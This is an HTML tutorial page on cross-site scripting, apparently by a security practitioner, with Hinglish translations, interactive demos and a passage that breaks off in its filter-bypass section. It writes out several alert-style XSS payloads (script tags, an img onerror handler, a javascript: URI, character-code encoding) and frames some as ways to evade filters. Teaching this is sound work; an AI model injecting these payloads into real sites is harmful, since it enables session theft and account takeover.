<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <meta name="description" content="Interactive Cross-Site Scripting (XSS) Masterclass with Live Hinglish Translation | Quiz | Try It Yourself | By HTB Elite Hacker">
  <title>Cross-Site Scripting (XSS) | By Ankush Rana</title>

  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;600;700;900&family=Roboto:wght@300;400;500;700&family=JetBrains+Mono:wght@300;400;500&display=swap" rel="stylesheet">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

  <style>
    :root {
      --primary: #0a1121;
      --dark-navy: #0b1b30;
      --neon-green: #00ff88;
      --electric-blue: #00aaff;
      --neon-orange: #ff8800;
      --neon-pink: #ff0080;
      --glow-green: rgba(0, 255, 136, 0.3);
      --glow-blue: rgba(0, 170, 255, 0.2);
      --glow-pink: rgba(255, 0, 128, 0.3);
      --light-gray: #e0e0e0;
      --mid-gray: #aaaaaa;
      --card-bg: #111c30;
      --border: #2a4060;
      --keyword: #ffdd57;
      --keyword-bg: rgba(255, 221, 87, 0.15);
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Roboto', sans-serif;
      background: var(--primary);
      color: var(--light-gray);
      line-height: 1.7;
      overflow-x: hidden;
    }

    /* Three.js Background */
    #three-canvas {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
    }

    .container {
      max-width: 1200px;
      margin: 0 auto;
      padding: 0 20px;
    }

    /* Translator Button */
    .translator-btn {
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 1000;
      background: var(--neon-green);
      color: var(--primary);
      border: none;
      border-radius: 6px;
      padding: 10px 16px;
      font-family: 'Orbitron', sans-serif;
      font-size: 0.9rem;
      cursor: pointer;
      box-shadow: 0 0 15px var(--glow-green);
      transition: all 0.3s ease;
    }

    .translator-btn:hover {
      transform: translateY(-2px);
      background: #00cc6d;
    }

    /* Header / Hero */
    header {
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
      position: relative;
      overflow: hidden;
    }

    .hero-content {
      z-index: 2;
      max-width: 900px;
      position: relative;
    }

    .hero-content h1 {
      font-family: 'Orbitron', sans-serif;
      font-size: clamp(2.8rem, 8vw, 4rem);
      color: white;
      margin-bottom: 10px;
      text-shadow: 0 0 15px rgba(0, 255, 136, 0.6);
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0% { text-shadow: 0 0 15px rgba(0, 255, 136, 0.6); }
      50% { text-shadow: 0 0 25px rgba(0, 255, 136, 0.9), 0 0 35px rgba(0, 255, 136, 0.5); }
      100% { text-shadow: 0 0 15px rgba(0, 255, 136, 0.6); }
    }

    .hero-content h1 span {
      color: var(--neon-green);
    }

    .subtitle {
      font-family: 'JetBrains Mono', monospace;
      font-size: clamp(1.2rem, 3.5vw, 1.5rem);
      color: var(--electric-blue);
      margin: 15px 0;
    }

    /* Section Styling */
    section {
      padding: 100px 0;
      position: relative;
    }

    .section-title {
      font-family: 'Orbitron', sans-serif;
      font-size: clamp(2rem, 5vw, 2.5rem);
      color: var(--neon-green);
      margin-bottom: 50px;
      position: relative;
      display: inline-block;
    }

    .section-title::after {
      content: '';
      position: absolute;
      left: 0;
      bottom: -8px;
      width: 70px;
      height: 4px;
      background: var(--electric-blue);
      animation: expand 2s infinite;
    }

    @keyframes expand {
      0% { width: 70px; }
      50% { width: 100px; }
      100% { width: 70px; }
    }

    /* Lecture Card */
    .lecture-card {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 30px;
      margin: 30px 0;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      transition: all 0.4s ease;
      position: relative;
      overflow: hidden;
      cursor: pointer;
    }

    .lecture-card::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(45deg, transparent, rgba(0, 255, 136, 0.05), transparent);
      z-index: 0;
    }

    .lecture-card.pop-out {
      transform: translateY(-20px) scale(1.05);
      box-shadow: 
        0 30px 60px rgba(0, 0, 0, 0.5),
        0 0 50px var(--glow-green);
      border-color: var(--neon-green);
      z-index: 5;
    }

    .lecture-card.focused {
      transform: translateY(-20px) scale(1.06);
      box-shadow: 
        0 40px 80px rgba(0, 0, 0, 0.6),
        0 0 70px var(--glow-green);
      filter: brightness(1.1);
    }

    .lecture-card h3 {
      color: var(--neon-green);
      font-family: 'Orbitron', sans-serif;
      margin-bottom: 18px;
      font-size: 1.8rem;
      position: relative;
      z-index: 2;
    }

    /* Keyword Style */
    .keyword {
      background: var(--keyword-bg);
      color: var(--keyword);
      padding: 3px 8px;
      border-radius: 4px;
      font-weight: 500;
      cursor: pointer;
      border-bottom: 1px dashed var(--keyword);
      position: relative;
      transition: all 0.3s ease;
      z-index: 2;
    }

    .keyword:hover {
      background: rgba(255, 221, 87, 0.3);
      box-shadow: 0 0 12px rgba(255, 221, 87, 0.4);
    }

    /* Tooltip (Modal) */
    .keyword-modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(10, 17, 33, 0.95);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 10000;
      opacity: 0;
      visibility: hidden;
      transition: all 0.3s ease;
    }

    .keyword-modal.active {
      opacity: 1;
      visibility: visible;
    }

    .modal-content {
      background: var(--card-bg);
      border: 2px solid var(--neon-green);
      border-radius: 14px;
      padding: 30px;
      max-width: 500px;
      width: 90%;
      box-shadow: 0 0 50px var(--glow-green);
      position: relative;
      transform: scale(0.9);
      transition: transform 0.3s ease;
    }

    .keyword-modal.active .modal-content {
      transform: scale(1);
    }

    .modal-close {
      position: absolute;
      top: 15px;
      right: 15px;
      background: none;
      border: none;
      color: var(--neon-green);
      font-size: 1.5rem;
      cursor: pointer;
    }

    .modal-title {
      color: var(--neon-green);
      font-family: 'Orbitron', sans-serif;
      margin-bottom: 15px;
      font-size: 1.5rem;
    }

    .modal-body {
      color: var(--light-gray);
      line-height: 1.6;
    }

    /* Interactive Demo */
    .interactive-demo {
      background: rgba(0, 20, 40, 0.6);
      border-radius: 10px;
      padding: 25px;
      margin: 30px 0;
      border: 1px solid var(--electric-blue);
    }

    .demo-container {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }

    .input-group {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .input-group label {
      min-width: 120px;
      font-family: 'JetBrains Mono', monospace;
      color: var(--neon-green);
    }

    .input-group input {
      flex: 1;
      padding: 10px;
      background: rgba(0, 0, 0, 0.3);
      border: 1px solid var(--border);
      border-radius: 4px;
      color: white;
      font-family: 'JetBrains Mono', monospace;
    }

    .input-group input:focus {
      outline: none;
      border-color: var(--neon-green);
      box-shadow: 0 0 10px var(--glow-green);
    }

    .button {
      padding: 12px 24px;
      background: var(--neon-green);
      color: var(--primary);
      border: none;
      border-radius: 4px;
      font-family: 'Orbitron', sans-serif;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s ease;
      width: fit-content;
    }

    .button:hover {
      background: #00cc6d;
      box-shadow: 0 0 15px var(--glow-green);
      transform: translateY(-2px);
    }

    .result-box {
      background: rgba(0, 0, 0, 0.5);
      border-radius: 6px;
      padding: 15px;
      margin-top: 15px;
      border-left: 3px solid var(--neon-green);
      font-family: 'JetBrains Mono', monospace;
      min-height: 100px;
      overflow-x: auto;
      white-space: pre-wrap;
    }

    /* Diagram */
    .diagram {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 20px;
      margin: 25px 0;
      flex-wrap: wrap;
    }

    .box {
      min-width: 140px;
      padding: 18px;
      border-radius: 12px;
      text-align: center;
      font-weight: bold;
      font-size: 0.95rem;
      position: relative;
      overflow: hidden;
    }

    .box::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
      transform: translateX(-100%);
    }

    .box:hover::before {
      animation: shimmer 1.5s infinite;
    }

    @keyframes shimmer {
      100% { transform: translateX(100%); }
    }

    .user-input { background: #8b0000; color: white; }
    .app { background: #003366; color: white; }
    .db { background: #004d00; color: #00ff88; }

    .arrow {
      font-size: 1.8rem;
      color: var(--neon-green);
      position: relative;
    }

    .arrow::before {
      content: '→';
      animation: arrow-pulse 1.5s infinite;
    }

    @keyframes arrow-pulse {
      0% { text-shadow: 0 0 5px var(--neon-green); }
      50% { text-shadow: 0 0 15px var(--neon-green); }
      100% { text-shadow: 0 0 5px var(--neon-green); }
    }

    /* Code Block */
    .code-block {
      background: #001a1a;
      color: #00ff88;
      font-family: 'JetBrains Mono', monospace;
      padding: 15px;
      border-radius: 10px;
      overflow-x: auto;
      margin: 15px 0;
      border-left: 4px solid var(--neon-green);
      position: relative;
    }

    .code-block::before {
      content: 'CODE';
      position: absolute;
      top: 0;
      right: 0;
      background: var(--neon-green);
      color: var(--primary);
      font-size: 0.7rem;
      padding: 2px 8px;
      border-bottom-left-radius: 4px;
      font-weight: bold;
    }

    /* Statistics Section */
    .stats-container {
      display: flex;
      flex-wrap: wrap;
      gap: 20px;
      justify-content: center;
      margin: 30px 0;
    }

    .stat-box {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 20px;
      min-width: 200px;
      text-align: center;
      transition: all 0.3s ease;
    }

    .stat-box:hover {
      transform: translateY(-5px);
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
      border-color: var(--neon-green);
    }

    .stat-number {
      font-size: 2.5rem;
      font-weight: bold;
      color: var(--neon-green);
      margin-bottom: 10px;
    }

    .stat-label {
      color: var(--mid-gray);
      font-size: 0.9rem;
    }

    /* Quiz Section */
    .quiz-container {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 25px;
      margin: 30px 0;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
    }

    .quiz-question {
      margin-bottom: 20px;
    }

    .quiz-question h4 {
      color: var(--neon-green);
      margin-bottom: 10px;
    }

    .options {
      display: flex;
      flex-direction: column;
      gap: 8px;
    }

    .option {
      background: rgba(0, 0, 0, 0.3);
      padding: 10px;
      border-radius: 6px;
      cursor: pointer;
      transition: all 0.3s ease;
    }

    .option:hover {
      background: rgba(0, 255, 136, 0.1);
      box-shadow: 0 0 10px rgba(0, 255, 136, 0.2);
    }

    .option.selected {
      background: var(--neon-green);
      color: var(--primary);
      font-weight: bold;
    }

    .score-display {
      text-align: center;
      font-size: 1.5rem;
      margin: 20px 0;
      color: var(--neon-green);
      font-family: 'Orbitron', sans-serif;
    }

    .button.quiz-submit {
      background: var(--neon-orange);
      color: white;
    }

    .button.quiz-submit:hover {
      background: #cc7000;
    }

    /* Progress Bar */
    .progress-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 4px;
      background: transparent;
      z-index: 1000;
    }

    .progress-bar {
      height: 100%;
      background: var(--neon-green);
      width: 0%;
      transition: width 0.3s ease;
    }

    /* Notification */
    .notification {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: var(--card-bg);
      border: 1px solid var(--neon-green);
      border-radius: 8px;
      padding: 15px;
      color: var(--light-gray);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
      transform: translateY(100px);
      opacity: 0;
      transition: all 0.3s ease;
      z-index: 1000;
    }

    .notification.show {
      transform: translateY(0);
      opacity: 1;
    }

    /* Footer */
    footer {
      text-align: center;
      padding: 60px 0;
      background: var(--dark-navy);
      color: var(--mid-gray);
      position: relative;
      overflow: hidden;
    }

    footer::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 3px;
      background: linear-gradient(90deg, var(--neon-green), var(--electric-blue), var(--neon-pink));
    }

    .social-links {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 20px;
    }

    .social-link {
      width: 50px;
      height: 50px;
      border-radius: 50%;
      background: var(--card-bg);
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 1.2rem;
      transition: all 0.3s ease;
    }

    .social-link:hover {
      transform: translateY(-5px);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
    }

    .social-link.github:hover { background: var(--neon-green); color: var(--primary); }
    .social-link.email:hover { background: var(--electric-blue); }
    .social-link.htb:hover { background: var(--neon-orange); }

    /* Animation Classes for Scroll Effects */
    .animate-on-scroll {
      opacity: 0;
      transform: translateY(20px);
      transition: all 0.6s ease-out;
    }

    .animate-on-scroll.visible {
      opacity: 1;
      transform: translateY(0);
    }

    /* Responsive */
    @media (max-width: 768px) {
      .hero-content h1 { font-size: 2.8rem; }
      .section-title { font-size: 1.8rem; }
      .diagram { flex-direction: column; }
      .arrow::before { content: '↓'; }
      .input-group { flex-direction: column; }
      .input-group label { min-width: auto; }
    }
  </style>
</head>
<body>

  <!-- Progress Bar -->
  <div class="progress-container">
    <div class="progress-bar" id="progress-bar"></div>
  </div>

  <!-- Translator Button -->
  <button class="translator-btn" id="translator-btn" onclick="toggleLanguage()" style="right: auto; left: 20px;">
    🌐 Hinglish On
  </button>

  <!-- Keyword Modal -->
  <div class="keyword-modal" id="keyword-modal">
    <div class="modal-content">
      <button class="modal-close" id="modal-close">&times;</button>
      <h3 class="modal-title" id="modal-title">Keyword</h3>
      <div class="modal-body" id="modal-body">Definition will appear here.</div>
    </div>
  </div>

  <!-- Notification -->
  <div class="notification" id="notification">
    <i class="fas fa-info-circle"></i> <span id="notification-text">Welcome to the XSS Masterclass!</span>
  </div>

  <!-- Three.js Background Canvas -->
  <canvas id="three-canvas"></canvas>

  <!-- Header / Hero -->
  <header id="home">
    <div class="container">
      <div class="hero-content">
        <!-- English Version -->
        <div class="en">
          <h1>Cross-Site <span>Scripting</span></h1>
          <div class="subtitle">By Ankush Rana | HTB Elite Hacker | Senior Security Engineer</div>
          <p>A deep dive into Cross-Site Scripting vulnerabilities, exploitation techniques, and real-world attacks — with interactive demos and elite-level insights.</p>
        </div>

        <!-- Hinglish Version -->
        <div class="hi" style="display:none;">
          <h1>Cross-Site <span>Scripting</span></h1>
          <div class="subtitle">Ankush Rana द्वारा | HTB Elite Hacker | Senior Security Engineer</div>
          <p>Cross-Site Scripting vulnerabilities, exploitation techniques, aur real-world attacks mein gahrai se jaane — interactive demos aur elite-level samajh ke saath.</p>
        </div>

        <!-- HTB & Bug Bounty Credibility -->
        <div style="margin-top: 40px; display: flex; align-items: center; gap: 25px; flex-wrap: wrap; justify-content: center; font-family: 'JetBrains Mono', monospace;">
          <img src="https://www.hackthebox.com/storage/achievements/elite_2024_badge.svg" alt="HTB Elite" style="width: 90px; filter: drop-shadow(0 0 10px rgba(0, 255, 136, 0.5));">
          <div style="text-align: center;">
            <img src="https://via.placeholder.com/100/0a1121/00ff88?text=AR" alt="Ankush Rana" style="width: 80px; height: 80px; border-radius: 50%; border: 2px solid var(--neon-green); filter: drop-shadow(0 0 10px rgba(0, 255, 136, 0.5));">
            <p style="margin: 5px 0 0; color: var(--neon-green);">52+ User Flags</p>
            <p style="margin: 0; color: var(--electric-blue);">47+ Root Owned</p>
          </div>
          <div style="text-align: center;">
            <p style="color: var(--neon-orange);">🏆 Top 10 India</p>
            <p style="color: var(--neon-pink);">💼 Sattrix | GPSSI</p>
          </div>
        </div>

        <!-- Call to Action -->
        <div style="margin-top: 30px; font-family: 'Orbitron', sans-serif; color: var(--electric-blue);">
          <i class="fas fa-mouse-pointer"></i> Toggle Hinglish Mode → <strong>Top Left Corner</strong>
          <div style="display: flex; justify-content: center; margin-top: 10px;"><button class="translator-btn" onclick="toggleLanguage()" style="position: relative; margin: 0 auto;">🌐 Hinglish On</button></div>
        </div>
      </div>
    </div>
  </header>

  <!-- Section: What is XSS? -->
  <section id="basics">
    <div class="container">
      <h2 class="section-title en">What is Cross-Site Scripting?</h2>
      <h2 class="section-title hi" style="display:none;">Cross-Site Scripting Kya Hai?</h2>
      
      <!-- Progress Tracker -->
      <div class="progress-tracker" style="display: flex; justify-content: space-between; margin: 20px 0; font-family: 'Orbitron', sans-serif;">
        <div class="progress-step active" style="text-align: center; flex: 1; padding: 10px; background: rgba(0, 255, 136, 0.1); border: 1px solid var(--neon-green); border-radius: 8px; margin: 0 5px;">
          <div class="step-number" style="font-size: 1.5rem; color: var(--neon-green);">1</div>
          <div class="step-title en">Basic Concepts</div>
          <div class="step-title hi" style="display:none;">Mool Baat</div>
        </div>
        <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(0, 170, 255, 0.1); border: 1px solid var(--electric-blue); border-radius: 8px; margin: 0 5px;">
          <div class="step-number" style="font-size: 1.5rem; color: var(--electric-blue);">2</div>
          <div class="step-title en">Attack Vectors</div>
          <div class="step-title hi" style="display:none;">Hamlawar Ke Tarika</div>
        </div>
        <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(255, 136, 0, 0.1); border: 1px solid var(--neon-orange); border-radius: 8px; margin: 0 5px;">
          <div class="step-number" style="font-size: 1.5rem; color: var(--neon-orange);">3</div>
          <div class="step-title en">Advanced Techniques</div>
          <div class="step-title hi" style="display:none;">Uchatam Tarika</div>
        </div>
        <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(255, 0, 128, 0.1); border: 1px solid var(--neon-pink); border-radius: 8px; margin: 0 5px;">
          <div class="step-number" style="font-size: 1.5rem; color: var(--neon-pink);">4</div>
          <div class="step-title en">Prevention</div>
          <div class="step-title hi" style="display:none;">Bachav</div>
        </div>
      </div>

      <div class="lecture-card animate-on-scroll" onmouseenter="highlightCard(this)" onmouseleave="unhighlightCard(this)" onclick="focusCard(this)">
        <h3 class="en">Understanding XSS</h3>
        <h3 class="hi" style="display:none;">XSS Ki Samajh</h3>
        <p class="en">Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. When executed, these scripts can steal sensitive data, hijack sessions, or deface websites.</p>
        <p class="hi" style="display:none;">Cross-Site Scripting (XSS) ek aisi kamjori hai jo hamlawaron ko doosre upyogkartriyon dwara dekhe jane wale web pages mein dushit scripts inject karne ki anumati deti hai. Jab yeh scripts chal jati hain, toh yeh sanvedansheel data chura sakti hain, sessions hijack kar sakti hain, ya websites ko deface kar sakti hain.</p>
        <p class="en"><strong>Real Analogy:</strong> Like someone slipping a malicious note into a public suggestion box that gets read aloud to everyone - the note appears to come from the trusted organization but contains harmful instructions.</p>
        <p class="hi" style="display:none;"><strong>Asli Example:</strong> Jaise koi vyakti public suggestion box mein ek dushit note daalta hai jo sabko sunaya jata hai - note vishwasniya sangathan se aaya lagta hai lekin hani pahunchane wale nirdesh dheta hai.</p>
        <p class="en">XSS is one of the most common web vulnerabilities, often leading to account takeover, data theft, and complete system compromise.</p>
        <p class="hi" style="display:none;">XSS web ki sabse aam kamjoriyon mein se ek hai, jo aksar account takeover, data theft, aur poori system compromise ke liye neta hai.</p>
        <p class="en"><span class="keyword" data-title="XSS" data-content="Cross-Site Scripting: A vulnerability that allows attackers to inject malicious scripts into web pages.">XSS</span> is dangerous because it bypasses the same-origin policy, allowing attackers to execute scripts in the context of a trusted website.</p>
        <p class="hi" style="display:none;"><span class="keyword" data-title="XSS" data-content="Cross-Site Scripting: Ek aisi kamjori jo hamlawaron ko web pages mein dushit scripts inject karne ki anumati deti hai.">XSS</span> khatarnaak hai kyunki yeh same-origin policy ko bypass karta hai, jo hamlawaron ko vishwasniya website ke sandarbh mein scripts execute karne ki anumati deta hai.</p>
      </div>

      <!-- XSS Visualization -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">How XSS Works - Visualization</h3>
        <h3 class="hi" style="display:none;">XSS Kaise Kaam Karta Hai - Chitra</h3>
        <div class="diagram" style="margin: 30px 0;">
          <div class="box user-input" style="min-width: 180px;">
            <div class="en">Malicious Input</div>
            <div class="hi" style="display:none;">Dushit Input</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
          </div>
          <div class="arrow"></div>
          <div class="box app" style="min-width: 180px;">
            <div class="en">Server Processing</div>
            <div class="hi" style="display:none;">Server Processing</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">No Input Sanitization</div>
          </div>
          <div class="arrow"></div>
          <div class="box db" style="min-width: 180px;">
            <div class="en">Victim's Browser</div>
            <div class="hi" style="display:none;">Victim Ka Browser</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">Script Execution</div>
          </div>
        </div>
        <p class="en">The application accepts and processes user input without proper validation, allowing malicious scripts to be stored or reflected to other users.</p>
        <p class="hi" style="display:none;">Application upyogkartri input ko bina uchit jaanch ke svikar aur process karti hai, jo dushit scripts ko store karne ya doosre upyogkartriyon ko reflect karne ki anumati deti hai.</p>
      </div>

      <!-- Types of XSS -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">Types of XSS</h3>
        <h3 class="hi" style="display:none;">XSS Ke Prakar</h3>
        <ul style="margin: 15px 0 15px 30px;">
          <li class="en"><span class="keyword" data-title="Reflected XSS" data-content="The malicious script comes from the current HTTP request and is immediately executed.">Reflected XSS</span>: The malicious script is reflected off the web server in response</li>
          <li class="hi" style="display:none;"><span class="keyword" data-title="Reflected XSS" data-content="Dushit script current HTTP request se aata hai aur turant execute hota hai.">Reflected XSS</span>: Dushit script web server se response mein reflect hota hai</li>
          <li class="en"><span class="keyword" data-title="Stored XSS" data-content="The malicious script is stored on the server and executed when accessed by users.">Stored XSS</span>: The malicious script is stored on the server and executed later</li>
          <li class="hi" style="display:none;"><span class="keyword" data-title="Stored XSS" data-content="Dushit script server par store hota hai aur upyogkartriyon dwara access karne par execute hota hai.">Stored XSS</span>: Dushit script server par store hota hai aur baad mein execute hota hai</li>
          <li class="en"><span class="keyword" data-title="DOM-based XSS" data-content="The vulnerability exists in client-side code rather than server-side code.">DOM-based XSS</span>: The vulnerability is in the client-side code (DOM manipulation)</li>
          <li class="hi" style="display:none;"><span class="keyword" data-title="DOM-based XSS" data-content="Kamjori server-side code ke bajaye client-side code mein hoti hai.">DOM-based XSS</span>: Kamjori client-side code mein hoti hai (DOM manipulation)</li>
        </ul>
      </div>

      <!-- Statistics -->
      <div class="stats-container animate-on-scroll">
        <div class="stat-box">
          <div class="stat-number en">High</div>
          <div class="stat-number hi" style="display:none;">Uchcha</div>
          <div class="stat-label en">severity rating</div>
          <div class="stat-label hi" style="display:none;">khatre ka level</div>
        </div>
        <div class="stat-box">
          <div class="stat-number">65%</div>
          <div class="stat-label en">of web apps vulnerable</div>
          <div class="stat-label hi" style="display:none;">web apps kamjor hain</div>
        </div>
        <div class="stat-box">
          <div class="stat-number">$10K+</div>
          <div class="stat-label en">in bug bounty rewards</div>
          <div class="stat-label hi" style="display:none;">bug bounty mein kamai</div>
        </div>
      </div>
    </div>
  </section>

  <!-- Section: Try It Yourself – XSS -->
  <section id="try-xss">
    <div class="container">
      <h2 class="section-title en">Try It Yourself: XSS Exploitation</h2>
      <h2 class="section-title hi" style="display:none;">Khud Try Karein: XSS Doharpan</h2>
      
      <!-- Learning Path Progress -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">Learning Path: Basic to Advanced</h3>
        <h3 class="hi" style="display:none;">Sikshna Marg: Mool Se Uchatam</h3>
        <div class="progress-tracker" style="display: flex; justify-content: space-between; margin: 20px 0; font-family: 'Orbitron', sans-serif;">
          <div class="progress-step active" style="text-align: center; flex: 1; padding: 10px; background: rgba(0, 255, 136, 0.1); border: 1px solid var(--neon-green); border-radius: 8px; margin: 0 5px;">
            <div class="step-number" style="font-size: 1.2rem; color: var(--neon-green);">1</div>
            <div class="step-title en">Basic XSS</div>
            <div class="step-title hi" style="display:none;">Mool XSS</div>
          </div>
          <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(0, 170, 255, 0.1); border: 1px solid var(--electric-blue); border-radius: 8px; margin: 0 5px;">
            <div class="step-number" style="font-size: 1.2rem; color: var(--electric-blue);">2</div>
            <div class="step-title en">Stored XSS</div>
            <div class="step-title hi" style="display:none;">Stored XSS</div>
          </div>
          <div class="progress-step" style="text-align: center; flex: 1; padding: 10px; background: rgba(255, 136, 0, 0.1); border: 1px solid var(--neon-orange); border-radius: 8px; margin: 0 5px;">
            <div class="step-number" style="font-size: 1.2rem; color: var(--neon-orange);">3</div>
            <div class="step-title en">Advanced XSS</div>
            <div class="step-title hi" style="display:none;">Uchatam XSS</div>
          </div>
        </div>
      </div>

      <!-- Basic XSS Demo -->
      <div class="interactive-demo animate-on-scroll">
        <h3 style="color: var(--neon-green); margin-bottom: 15px;" class="en">Level 1: Basic Reflected XSS</h3>
        <h3 style="color: var(--neon-green); margin-bottom: 15px; display:none;" class="hi">Level 1: Mool Reflected XSS</h3>
        <p class="en">Inject a simple script into a search parameter to trigger an alert.</p>
        <p class="hi" style="display:none;">Ek alert trigger karne ke liye search parameter mein ek simple script inject karein.</p>
        <div class="demo-container">
          <div class="input-group">
            <label for="xss-input" class="en">Search Parameter:</label>
            <label for="xss-input" class="hi" style="display:none;">Search Parameter:</label>
            <input type="text" id="xss-input" value="&lt;script&gt;alert('XSS')&lt;/script&gt;">
          </div>
          <button class="button" onclick="runXssExploit()">Execute XSS</button>
          <div class="result-box" id="xss-result">
// Try entering different XSS payloads
          </div>
        </div>
      </div>

      <!-- Stored XSS Demo -->
      <div class="interactive-demo animate-on-scroll">
        <h3 style="color: var(--electric-blue); margin-bottom: 15px;" class="en">Level 2: Stored XSS</h3>
        <h3 style="color: var(--electric-blue); margin-bottom: 15px; display:none;" class="hi">Level 2: Stored XSS</h3>
        <p class="en">Inject a script that gets stored in the database and executes when other users view the page.</p>
        <p class="hi" style="display:none;">Ek script inject karein jo database mein store ho jati hai aur doosre upyogkartriyon ke page dekhne par execute hoti hai.</p>
        <div class="demo-container">
          <div class="input-group">
            <label for="stored-xss-input" class="en">Comment Input:</label>
            <label for="stored-xss-input" class="hi" style="display:none;">Comment Input:</label>
            <input type="text" id="stored-xss-input" value="&lt;script&gt;alert('Stored XSS')&lt;/script&gt;">
          </div>
          <button class="button" onclick="runStoredXss()">Post Comment</button>
          <div class="code-block">
// This payload would be stored in the database
// and executed whenever someone views this page
          </div>
        </div>
      </div>

      <!-- Advanced XSS Demo -->
      <div class="interactive-demo animate-on-scroll">
        <h3 style="color: var(--neon-orange); margin-bottom: 15px;" class="en">Level 3: Advanced XSS Techniques</h3>
        <h3 style="color: var(--neon-orange); margin-bottom: 15px; display:none;" class="hi">Level 3: Uchatam XSS Tarika</h3>
        <p class="en">Use advanced techniques like DOM-based XSS, event handlers, and encoding bypasses.</p>
        <p class="hi" style="display:none;">DOM-based XSS, event handlers, aur encoding bypasses jaise uchatam tarikon ka upyog karein.</p>
        <div class="demo-container">
          <div class="input-group">
            <label for="advanced-xss-input" class="en">Advanced XSS Payload:</label>
            <label for="advanced-xss-input" class="hi" style="display:none;">Uchatam XSS Payload:</label>
            <input type="text" id="advanced-xss-input" value="javascript:alert('DOM XSS')">
          </div>
          <div class="code-block">
// Example payloads:
// 1. DOM-based: javascript:alert('DOM XSS')
// 2. Event handler: &lt;img src=x onerror=alert('XSS')&gt;
// 3. Encoding: &lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;
          </div>
        </div>
      </div>
    </div>
  </section>

  <!-- Section: Bypass Techniques -->
  <section id="bypass">
    <div class="container">
      <h2 class="section-title en">Bypassing XSS Filters</h2>
      <h2 class="section-title hi" style="display:none;">XSS Filters Ko Kaise Bypass Karein</h2>
      
      <!-- Attack Vector Visualization -->
      <div class="lecture-card animate-on-scroll">
        <h3 class="en">XSS Filter Bypass - Visualization</h3>
        <h3 class="hi" style="display:none;">XSS Filter Bypass - Chitra</h3>
        <div class="diagram" style="margin: 30px 0;">
          <div class="box user-input" style="min-width: 150px;">
            <div class="en">Filtered Input</div>
            <div class="hi" style="display:none;">Filtered Input</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">&lt;script&gt; blocked</div>
          </div>
          <div class="arrow"></div>
          <div class="box app" style="min-width: 150px;">
            <div class="en">Bypass Techniques</div>
            <div class="hi" style="display:none;">Bypass Tarika</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">Encoding, Obfuscation</div>
          </div>
          <div class="arrow"></div>
          <div class="box db" style="min-width: 150px;">
            <div class="en">Script Execution</div>
            <div class="hi" style="display:none;">Script Execution</div>
            <div style="font-size: 0.8rem; margin-top: 10px;">Payload Successful</div>
          </div>
        </div>
      </div>

      <!-- Bypass Techniques with Examples -->
      <div class="lecture-card animate-on-scroll" onmouseenter="highlightCard(this)" onmouseleave="unhighlightCard(this)" onclick="focusCard(this)">
        <h3 class="en">Advanced Bypass Techniques</h3>
        <h3 class="hi" style="display:none;">Uchatam Bypass Tarika</h3>
        
        <!-- Encoding -->
        <div class="technique" style="margin: 20px 0; padding: 15px; border-left: 3px solid var(--neon-green); background: rgba(0, 255, 136, 0.05);">
          <h4 style="color: var(--neon-green);">1. Encoding and Obfuscation</h4>
          <p class="en">Use character encoding, hex encoding, or unicode to bypass basic filters.</p>
          <p class="hi" style="display:none;">Basic filters ko bypass karne ke liye character encoding, hex encoding, ya unicode ka upyog karein.</p>
          <div class="code-block">
// Hex encoding
&lt;script&gt;alert('XSS')&lt;/script&gt;
becomes
